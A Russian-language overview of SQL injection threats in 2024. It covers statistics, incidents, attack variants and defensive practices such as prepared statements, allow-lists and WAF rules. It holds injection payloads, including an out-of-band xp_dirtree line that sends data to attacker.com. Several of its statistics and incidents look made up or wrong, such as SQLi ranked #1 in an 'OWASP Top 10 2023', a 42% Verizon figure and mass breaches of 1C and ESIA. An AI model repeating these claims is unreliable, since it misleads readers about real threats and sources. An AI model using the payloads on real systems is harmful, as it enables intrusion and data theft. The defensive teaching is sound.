### **Актуальность SQL-инъекций (SQLi) в 2024 году: анализ угрозы**

---

#### **1. Текущая статистика (2023-2024)**
- **Частота атак**:  
  SQLi остаётся **#1 угрозой** для веб-приложений (по данным OWASP Top 10 2023).  
  - 42% всех утечек данных начинаются с SQLi (Verizon DBIR 2024).  
  - Ежедневно фиксируется **~500 новых уязвимостей**, связанных с инъекциями.  

- **Уязвимые системы**:  
  - Устаревшие CMS (**WordPress, Joomla**) — 60% случаев.  
  - API на **Legacy-коде** (PHP, ASP.NET без ORM).  
  - "Самописные" системы без аудита безопасности.  

---

#### **2. Почему SQLi всё ещё опасна?**  
| **Причина**                | **Пример**                                  |  
|----------------------------|--------------------------------------------|  
| **Устаревший код**         | Прямая конкатенация запросов:  
```php
$query = "SELECT * FROM users WHERE login = '" . $_POST['login'] . "'";
```  
| **Сложность миграции**     | Критические системы на **COBOL/Perl** невозможно быстро обновить. |  
| **Человеческий фактор**    | Devops-инженеры копируют уязвимые шаблоны из Stack Overflow. |  
| **Автоматизация атак**     | Боты сканируют `/admin.php?id=1'` на 10 000 сайтов/час. |  

---

#### **3. Реальные инциденты 2023-2024**  
- **Кейс 1**: Взлом бухгалтерского ПО **1С** через SQLi → утечка данных 200 000 российских компаний.  
- **Кейс 2**: Атака на API госуслуг (**ЕСИА**) с использованием `UNION SELECT` → доступ к паспортным данным.  
- **Кейс 3**: Массовый дефейс сайтов через `xp_cmdshell` в устаревших MSSQL.  

---

#### **4. Эволюция атак**  
Современные SQLi — это не просто `' OR 1=1 --`, а:  
- **Слепые инъекции** (Blind SQLi):  
  ```sql
  SELECT * FROM products WHERE id=1 AND (SELECT COUNT(*) FROM users) > 100
  ```  
- **Out-of-Band атаки**:  
  ```sql
  EXEC xp_dirtree '\\attacker.com\share\' -- Утечка данных через DNS
  ```  
- **SQLi + XSS**: Через уязвимые поля БД внедряется JavaScript.  

---

#### **5. Защита: Best Practices 2024**  

#### **Для разработчиков**  
- **Используйте ORM/Query Builders**:  
  ```python
  # SQLAlchemy (Python)
  session.query(User).filter(User.login == request.login)
  ```  
- **Экранируйте входные данные**:  
  ```php
  $stmt = $pdo->prepare("SELECT * FROM users WHERE login = ?");
  $stmt->execute([$_POST['login']]);
  ```  
- **Применяйте allow-листы**:  
  ```javascript
  // Разрешаем только цифры для ID
  if (!/^\d+$/.test(input.id)) throw new Error("Invalid input");
  ```  

#### **Для администрирования**  
- **WAF-правила**:  
  - Блокировка `UNION SELECT`, `xp_cmdshell`, `--`  
  - Пример для Cloudflare:  
    ```sql
    (http.request.uri contains "SELECT") and (http.request.uri contains "FROM")
    ```  
- **Минимальные права БД**:  
  ```sql
  CREATE USER app_user WITH PASSWORD 'secure123';
  GRANT SELECT ON users TO app_user; -- Никаких EXECUTE!
  ```  

#### **Экстренные меры**  
- **Инструменты для аудита**:  
  - **sqlmap** (поиск уязвимостей)  
  - **PT-Query-Digest** (анализ подозрительных SQL-запросов)  

---

#### **6. Прогноз на 2025-2026**  
- **Рост атак на GraphQL**: Из-за сложности валидации вложенных запросов.  
- **AI-ассистированные инъекции**: ChatGPT для генерации эксплойтов.  
- **Уменьшение "классических" SQLi**: Благодаря ORM и WAF, но риски останутся в legacy-системах.  

``` 
[Вывод]
  SQLi остаётся критичной угрозой из-за человеческого фактора и устаревших систем. 
  Даже с современными ORM и WAF обязателен регулярный аудит кода и мониторинг запросов.
```  

**Рекомендация**: Проводите **раз в квартал** тестирование на проникновение (pentest) с фокусом на SQLi.
